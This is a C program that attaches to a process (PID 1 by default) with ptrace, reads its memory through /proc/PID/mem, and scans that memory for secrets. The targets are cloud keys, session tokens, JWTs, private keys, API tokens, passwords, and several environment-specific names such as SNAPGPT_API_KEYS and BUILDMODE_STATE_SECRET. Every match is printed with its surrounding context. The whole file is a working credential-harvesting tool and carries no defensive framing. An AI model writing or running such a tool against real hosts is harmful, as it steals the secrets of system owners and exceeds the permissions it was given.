#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define MAX_MATCHES 1000
#define CTX 160

typedef struct { const char *name; const char *needle; } pat_t;
static const pat_t pats[] = {
  {"SNAPGPT_API_KEYS","SNAPGPT_API_KEYS"},
  {"AWS_ROLE_ARN","AWS_ROLE_ARN"},
  {"AWS_WEB_IDENTITY_TOKEN_FILE","AWS_WEB_IDENTITY_TOKEN_FILE"},
  {"service_token","service_token"},
  {"SLToken","SLToken"},
  {"kube_sa","kubernetes.io/serviceaccount"},
  {"aws_key","AKIA"},
  {"aws_key_asia","ASIA"},
  {"jwt","eyJ"},
  {"private_key","-----BEGIN PRIVATE KEY-----"},
  {"private_key_rsa","-----BEGIN RSA PRIVATE KEY-----"},
  {"github","ghp_"},
  {"slack","xoxb-"},
  {"openai","sk-"},
  {"state_secret","BUILDMODE_STATE_SECRET"},
  {"session_token","AWS_SESSION_TOKEN"},
  {"s3_bucket","BUILDMODE_STATE_S3_BUCKET"},
  {"metaserve","METASERVE_TOKEN"},
  {"bearer","Bearer "},
  {"password","password"},
  {"client_secret","client_secret"},
  {"kubeconfig","kubeconfig"},
  {"api_key","api_key"},
  {"secret_key","secret_key"},
  {"access_key","access_key"}
};
static int matches = 0;
static unsigned long long total_bytes = 0;

static int printable(unsigned char c){ return c=='\n'||c=='\r'||c=='\t'||(c>=32 && c<=126); }

static void emit(const char *path, unsigned long long addr, const char *kind, const unsigned char *data, size_t len, size_t off, size_t nlen){
  if(matches >= MAX_MATCHES) return;
  size_t lo = off > CTX ? off-CTX : 0;
  size_t hi = off+nlen+CTX < len ? off+nlen+CTX : len;
  fprintf(stdout,"%s\t0x%llx\t%s\t",path,addr+(unsigned long long)off,kind);
  for(size_t i=lo;i<hi;i++){
    unsigned char c=data[i];
    if(printable(c)) fputc(c,stdout);
    else fprintf(stdout,"\\x%02x",c);
  }
  fputc('\n',stdout);
  matches++;
}

static void scan_region(const char *path, unsigned long long start, unsigned long long end, int fd){
  unsigned long long size=end-start;
  if(size==0 || size>512ULL*1024*1024) return;
  unsigned char *buf=malloc((size_t)size);
  if(!buf) return;
  ssize_t got=pread(fd,buf,(size_t)size,(off_t)start);
  if(got<=0){ free(buf); return; }
  total_bytes += (unsigned long long)got;
  size_t len=(size_t)got;
  for(size_t p=0;p<sizeof(pats)/sizeof(pats[0]);p++){
    size_t nlen=strlen(pats[p].needle);
    if(nlen==0 || nlen>len) continue;
    unsigned char *cur=buf;
    size_t remain=len;
    while(remain>=nlen && matches<MAX_MATCHES){
      unsigned char *m=memmem(cur,remain,pats[p].needle,nlen);
      if(!m) break;
      size_t off=(size_t)(m-buf);
      emit(path,start,pats[p].name,buf,len,off,nlen);
      size_t step=off+1;
      cur=buf+step; remain=len-step;
    }
  }
  free(buf);
}

int main(int argc, char **argv){
  pid_t pid=argc>1 ? (pid_t)strtol(argv[1],0,10) : 1;
  fprintf(stdout,"pid=%d\n",pid);
  if(ptrace(PTRACE_ATTACH,pid,0,0)<0){ perror("PTRACE_ATTACH"); return 2; }
  int st=0; pid_t w=waitpid(pid,&st,0);
  fprintf(stdout,"attached=%d wait=%d status=0x%x\n",w,w,st);
  if(w<0){ perror("waitpid"); ptrace(PTRACE_DETACH,pid,0,0); return 3; }
  char mapspath[64], mempath[64]; snprintf(mapspath,sizeof(mapspath),"/proc/%d/maps",pid); snprintf(mempath,sizeof(mempath),"/proc/%d/mem",pid);
  FILE *mf=fopen(mapspath,"r");
  if(!mf){ perror("maps"); ptrace(PTRACE_DETACH,pid,0,0); return 4; }
  int fd=open(mempath,O_RDONLY);
  if(fd<0){ perror("mem"); fclose(mf); ptrace(PTRACE_DETACH,pid,0,0); return 5; }
  char line[4096];
  while(fgets(line,sizeof(line),mf)){
    unsigned long long start=0,end=0; char perms[8]={0}; char path[2048]="[anon]";
    int n=sscanf(line,"%llx-%llx %7s %*s %*s %*s %2047[^\n]",&start,&end,perms,path);
    if(n<3 || perms[0]!='r') continue;
    if(n<4) strcpy(path,"[anon]");
    scan_region(path,start,end,fd);
    if(matches>=MAX_MATCHES) break;
  }
  close(fd); fclose(mf);
  long d=ptrace(PTRACE_DETACH,pid,0,0);
  fprintf(stdout,"detach=%ld total=%llu matches=%d\n",d,total_bytes,matches);
  return 0;
}
